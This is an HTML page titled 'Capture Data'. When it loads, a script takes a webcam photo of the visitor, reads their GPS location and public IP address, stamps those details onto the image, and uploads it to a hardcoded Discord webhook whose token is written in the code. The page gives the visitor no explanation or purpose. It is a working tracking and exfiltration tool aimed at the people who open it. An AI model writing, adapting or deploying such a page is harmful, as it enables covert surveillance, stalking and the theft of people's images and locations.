<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Capture Data</title>
  <style>
    body {
      margin: 0;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-image: url('https://cdn.unstability.ai/users/f6624cb8-cdb4-4e46-adb4-6567149af7e4/images/15412224-0be4-4e37-9432-b83f475946ea/0.png');
      background-size: cover;
      background-position: center;
      color: white;
      text-align: center;
    }
    canvas {
      display: none;
    }
    #console {
      background-color: rgba(0, 0, 0, 0.7);
      color: lime;
      font-family: monospace;
      padding: 10px;
      width: 90%;
      max-width: 600px;
      height: 200px;
      overflow-y: auto;
      border: 1px solid white;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas"></canvas>
  <div id="console"></div>

  <script>
    const debugConsole = document.getElementById("console");

    function logMessage(message) {
      const timestamp = new Date().toISOString();
      debugConsole.innerHTML += `[${timestamp}] ${message}<br>`;
      debugConsole.scrollTop = debugConsole.scrollHeight;
      console.log(message);
    }

    async function main() {
      const webhookURL = "https://discord.com/api/webhooks/1270166449318793296/eJjxv6udxX13mJVpn5ubPqzYQMI9-Xue9G0LAelkswYqcDVVgZp0cLfHXb55RkaPw_w2";

      logMessage("Initializing...");

      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      const ctx = canvas.getContext("2d");

      try {
        // Access camera
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        logMessage("Camera accessed.");

        // Wait for video metadata to load
        await new Promise(resolve => (video.onloadedmetadata = resolve));

        // Capture image
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const imageData = canvas.toDataURL("image/png");
        logMessage("Image captured.");

        // Stop video stream
        stream.getTracks().forEach(track => track.stop());
        logMessage("Camera stream stopped.");

        // Get user location
        logMessage("Fetching GPS location...");
        const position = await new Promise((resolve, reject) =>
          navigator.geolocation.getCurrentPosition(resolve, reject)
        );
        const { latitude, longitude } = position.coords;
        logMessage(`Location fetched: Latitude ${latitude}, Longitude ${longitude}`);

        // Get user IP
        logMessage("Fetching IP address...");
        const ipResponse = await fetch("https://api64.ipify.org?format=json");
        const { ip } = await ipResponse.json();
        logMessage(`IP address fetched: ${ip}`);

        // Overlay data on image
        ctx.fillStyle = "red";
        ctx.font = "24px Arial";
        ctx.fillText(`IP: ${ip}`, 10, canvas.height - 50);
        ctx.fillText(`Lat: ${latitude.toFixed(6)}`, 10, canvas.height - 30);
        ctx.fillText(`Long: ${longitude.toFixed(6)}`, 10, canvas.height - 10);
        const finalImage = canvas.toDataURL("image/png");

        // Convert base64 image to Blob
        const base64Data = finalImage.split(',')[1];
        const byteCharacters = atob(base64Data);
        const byteNumbers = Array.from(byteCharacters).map(char => char.charCodeAt(0));
        const byteArray = new Uint8Array(byteNumbers);
        const imageBlob = new Blob([byteArray], { type: 'image/png' });

        // Prepare FormData
        logMessage("Preparing data for webhook...");
        const formData = new FormData();
        formData.append("file", imageBlob, "captured_image.png");
        formData.append("payload_json", JSON.stringify({
          content: "Captured user data:",
          embeds: [
            {
              title: "User Data",
              description: `IP: ${ip}\nLatitude: ${latitude}\nLongitude: ${longitude}`,
              color: 16711680
            }
          ]
        }));

        // Send data to webhook
        logMessage("Sending data to Discord webhook...");
        const response = await fetch(webhookURL, {
          method: "POST",
          body: formData
        });

        if (response.ok) {
          logMessage("Data sent successfully to Discord.");
        } else {
          const errorText = await response.text();
          logMessage(`Failed to send data: ${response.status} ${response.statusText} - ${errorText}`);
        }
      } catch (error) {
        logMessage(`Error: ${error.message}`);
        console.error(error);
      }
    }

    main();
  </script>
</body>
</html>
